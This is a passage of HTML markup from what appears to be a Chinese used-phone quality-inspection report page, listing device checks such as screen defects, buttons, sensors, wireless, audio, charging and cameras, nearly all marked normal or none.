                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">音频网罩</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">卡托</span>
                                               <div data-v-6c23bb1f="" data-v-422d6a4e="" class="z-tip-trigger qc-tip" data-v-6e9300e2=""><img data-v-6c23bb1f="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAdVBMVEUAAACioqKxsbGkpKSZmZmbm5ubm5ugoKCampqampqampqampqbm5uampqZmZmampqZmZmampqZmZmZmZmZmZmampqampqZmZmbm5uampqampqZmZmampqampqampqbm5uZmZmampqcnJybm5udnZ2ampqZmZl5lL2WAAAAJnRSTlMACgMR5mZeGfd8x7tA8uySWdrMro/63rdSJk43O3CBPaTDMyEemoNUSnwAAAHkSURBVEjHlZbrkqMgEIUh4l2Md6O5zezMfu//iDsVK1Eg7JTnj1SDNKf70I1wIOdurMu+L+uxm6X4BUHUJmyQtFEg/JCpBrK0KiYpp6JKM0CnPjeHUEEexltbHOagwsO79XED2d213zNoYtd+Vgyn965PA+psG6OE3EsvyEkiaz0cD8KLwxEi4zwJV/FfXEnOG76Ko/gFR1T8ctiQW+eR31Nsmg45zdMSMgRmQj57QLcXg/lAuIykwojnV80T3dbLCbXkPCUzEqhAt7frsQaTWkb6cKUxXOfQfD1OdgNj6oIOHinIhWGlfKpthA9jr0cyWkIzfGtKChi2cyHtD+UEQ1kNTC86kBj0SKSYTcqiBPmKJChh0p5FR2qqKqpe4xk+jcmUToxUXsk1WLtVjKKm8MuH0pR8QS1KJs/+f6G3rtREKXrk+/UtJPYVlPTeHz5AF8L9wXekEMo/jnWi9JCWmtVukPaENYJxGdlhXRLnoGNVmJW4mewd5fVEljQW8bm+b7fvZWSLz5K3C0ve9gVy4V6gQHN32Q2Zm4U7OrCLwHrVqF3KpGuZseMN2iniKGkWshWBgu7naxcyf6kMqkIIt1TuLcZ7y/3uhrK/Ze1vim7bvbj2i9F29zb2/U+H/Y+T3c+ff7fyM0rxm6h8AAAAAElFTkSuQmCC">
                                                   <div class="z-tip" style="visibility: hidden; display: none;"><i class="z-tip-angle right" style="top: 115.5px;"></i>
                                                       <!---->
                                                       <div class="z-tip-content">卡托可能非原装，不影响使用</div>
                                                   </div>
                                               </div> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <!---->
                               </dl>
                           </div>
                       </div>
                       <div data-v-6e9300e2="" class="content-wrap-antoggle"></div>
                   </div>
                   <!---->
                   <div data-v-6e9300e2="" data-v-422d6a4e="" class="qc-report-tab">
                       <div data-v-6e9300e2="" class="report-tab-tt"><span data-v-6e9300e2="" class="tt">设备功能</span>
                           <div data-v-6e9300e2="" class="con hideCheckedIcon">
                               <!---->
                               <div data-v-6e9300e2="" class="check-num normal"><img data-v-6e9300e2="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAAXNSR0IArs4c6QAAASxQTFRFAAAAVf+qVeOOZuaZWuGHVdmEU9qGVdiGU9iFUteFUteFUtiEUtiEU9iDUtiEU9iEU9eEUteEUteEUtiEUteDU9iDU9eDUteDU9eDVNeEVdeFVteFVtiGWdiIXdmLYtqPZNuQZtuRZ9ySadyTa9yVbN2Vbt2Xb92Xb92YcN6Yc96adN+bdt+dd9+eeN+ee+CgfOChf+GjgeGlhOKnhuOoieOqi+Ssj+WukeWwlOaylua0mee2oOm6oum8puq/rOvDruzFsu3IuO7Muu/Nve/Qv/DRxfHVyPLY0PTd2fbj4Pfp4fjp4/jr5fns5/nu6vrw6/rw7Prx7vvy8Pv08fv18vz28/z29Pz39fz49v359/35+P36+f37+v37+v78+/78/P79/f7+/v7+////AK3cAAAAABd0Uk5TAAMJChEbN05cYGZ8j6+3y9vm7PL19/mS+y5dAAABpUlEQVRIx52Wd1uDMBDG00nZBAqpe++9t3XvWbVurfL9v4NBrBKSpsT3DzjC7x7I5e4SAOJKS5ph2Z5nW4YmpUETZWW9iCIq6nKWg2dUB1Fy1EwDPKVAxBRUUiw+Z6KGMnM0n4eII5iP8wUXceUWYjxqKsIj7zZ3cCN/lYMogeDvzFMmSiSzHl0FJZTys74wqQMM11xFiaV+55uT3MEJMlFGApKxg84l2nuIRx3XS5HHtxxWhon6SAOJ+4E9369ORAckoPH4bR9rPzqiAYPDbwb8UVt0yABWY34t4I87iDEL2LGo/JlLn5g/7STf28AjnnvPl+vm3DvmL7piX/VIh8FrvzYfmlPPmK/0IcqB+KUTDL1MB9boPTarI9S8bHLSQ3cYexhDqP8GG0+TdCCsWFjHHzF4O9B9iW9vs4zIGfGFm3nF6NUZvnwsskKtUamxUPNDrTLXRqKTbyXkN5g8Tj46vdcDfou9+DqzgMq+v8spIEaJ7hyUOCXKaAKlVl4TEG8zwo1MvFUKN2Pxdi++oYhvWeKbovi2K76xix8d/nE4SXL8+QKBmsD8vLm4GwAAAABJRU5ErkJggg=="> <span data-v-6e9300e2="">全部正常</span></div>
                               <!---->
                               <!----> <img data-v-6e9300e2="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAAXNSR0IArs4c6QAAAI1QTFRFAAAA////4+Pj5ubm6urq6+vr4eHh39/f2dnZ3d3d2tra2dnZ2dnZ29vbmpqa29vbmZmZ2tram5ub2tra2NjY2tra2dnZ2dnZ2tra2tra2tra2dnZ2dnZ2dnZ2dnZ2dnZ2NjY2dnZ2dnZ2dnZmpqa2NjY2NjY2NjY2NjY2dnZ2NjYmpqa2dnZmZmZ2NjY3xFN7gAAAC10Uk5TAAMJCgwNERgbJjc8PUBJTlBSV1pcYGVmb3yPkq+3u8fL293e4+bs8vX3+fz+MhX0CwAAAbtJREFUSMedVte2gjAQDIoodlBEVMBCkTb//3kXgyWRIMndB87JMnOyLbtLyLcMVgf/kuR5cvEPqwHpEcM53cHI/eQYP+BDLwXK0NsszNHIXGy8sARSb9gB19wYCNwxqxu7ARC7mgg/OQPhvK2fh8B50tZPY1wt8dXWDfH0W7nNEHS6ZwTItl944Kh1R0M7AhxjmmH/O957ZIxVkxjHvgwdEb89184ItD6CFuD8Arm4GqRXjCvcZ35jWERCLMRNzj2EREpCePSqFDM5wgzpw3QHAZGUAE79PWEnS3Bxqt/LvRzLEsblfUBWsi43bq/IoXFdTjwciI8No1lG0ZpFrKNoyRw38MkFC0YTVVVhf452UVUR83uBC0lg8gSG8cBzBBMJyaGzJhQMg+IL1kQdeU0YsUbbH4ZdVLyBhIxqAm8SAxPgqUm80x+GCE+d5sP6YYjwNKyCxFGGCE8TJyqNhtHG09IQFt+DIcDT4qvL220XzfqrRJjyVn9A9ROdy+HnzRNVbgLqbUa2kd3e0VFulcrNWL3dqw8U9ZGlPhSfY1fQlmcdY/c12Hf8YN91D3Z+ddD1/tXhH8uJzPrzBy7RRUfOJpykAAAAAElFTkSuQmCC" class="arrow">
                           </div>
                       </div>
                       <div data-v-6e9300e2="" class="content-wrap-show"></div>
                       <div data-v-6e9300e2="" class="content-wrap-toggle">
                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="grey-bg">
                               <dl data-v-422d6a4e="" data-v-6e9300e2="" class="qc-item-sec">
                                   <dt data-v-422d6a4e="" data-v-6e9300e2="">屏幕显示</dt>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">其它</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">进灰</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">亮点</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">坏点</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">红屏</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">老化</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">气泡</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">图像/文字印痕</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">漏液</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">色斑</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">亮斑</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">条纹</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">压伤</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">显示不均匀</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">无</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <!---->
                               </dl>
                               <dl data-v-422d6a4e="" data-v-6e9300e2="" class="qc-item-sec">
                                   <dt data-v-422d6a4e="" data-v-6e9300e2="">屏幕触控</dt>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">触摸</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <!---->
                               </dl>
                               <dl data-v-422d6a4e="" data-v-6e9300e2="" class="qc-item-sec">
                                   <dt data-v-422d6a4e="" data-v-6e9300e2="">按键</dt>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">电源键</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">音量增键</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">音量减键</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">静音键</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <!---->
                               </dl>
                               <dl data-v-422d6a4e="" data-v-6e9300e2="" class="qc-item-sec">
                                   <dt data-v-422d6a4e="" data-v-6e9300e2="">生物识别</dt>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">面部识别</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <!---->
                               </dl>
                               <dl data-v-422d6a4e="" data-v-6e9300e2="" class="qc-item-sec">
                                   <dt data-v-422d6a4e="" data-v-6e9300e2="">传感器</dt>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">重力感应</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">指南针</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">距离感应</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">光线感应</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <!---->
                               </dl>
                               <dl data-v-422d6a4e="" data-v-6e9300e2="" class="qc-item-sec">
                                   <dt data-v-422d6a4e="" data-v-6e9300e2="">接口</dt>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">数据接口</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <!---->
                               </dl>
                               <dl data-v-422d6a4e="" data-v-6e9300e2="" class="qc-item-sec">
                                   <dt data-v-422d6a4e="" data-v-6e9300e2="">无线</dt>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">wifi</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">蓝牙</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">NFC</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <!---->
                               </dl>
                               <dl data-v-422d6a4e="" data-v-6e9300e2="" class="qc-item-sec">
                                   <dt data-v-422d6a4e="" data-v-6e9300e2="">声音与振动</dt>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">正面麦克风</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">振动</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">扬声器</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">底部麦克风</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">听筒</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <!---->
                               </dl>
                               <dl data-v-422d6a4e="" data-v-6e9300e2="" class="qc-item-sec">
                                   <dt data-v-422d6a4e="" data-v-6e9300e2="">充电</dt>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">无线充电</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">有线充电</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <!---->
                               </dl>
                               <dl data-v-422d6a4e="" data-v-6e9300e2="" class="qc-item-sec">
                                   <dt data-v-422d6a4e="" data-v-6e9300e2="">通话功能</dt>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">SIM 卡1</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">SIM 卡2</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <!---->
                               </dl>
                               <dl data-v-422d6a4e="" data-v-6e9300e2="" class="qc-item-sec">
                                   <dt data-v-422d6a4e="" data-v-6e9300e2="">摄像头</dt>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">前置摄像头</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">后置摄像头</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">闪光灯</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
                                   </dd>
                                   <!---->
                               </dl>
                               <dl data-v-422d6a4e="" data-v-6e9300e2="" class="qc-item-sec">
                                   <dt data-v-422d6a4e="" data-v-6e9300e2="">其他状况</dt>
                                   <dd data-v-422d6a4e="" data-v-6e9300e2="">
                                       <div data-v-422d6a4e="" data-v-6e9300e2="" class="value-item">
                                           <div data-v-422d6a4e="" data-v-6e9300e2="" class="con"><span data-v-422d6a4e="" data-v-6e9300e2="" class="k">软件检测</span>
                                               <!----> <span data-v-422d6a4e="" data-v-6e9300e2="" class="line"></span> <span data-v-422d6a4e="" data-v-6e9300e2="" class="v">正常</span>
                                           </div>
                                           <!---->
                                       </div>
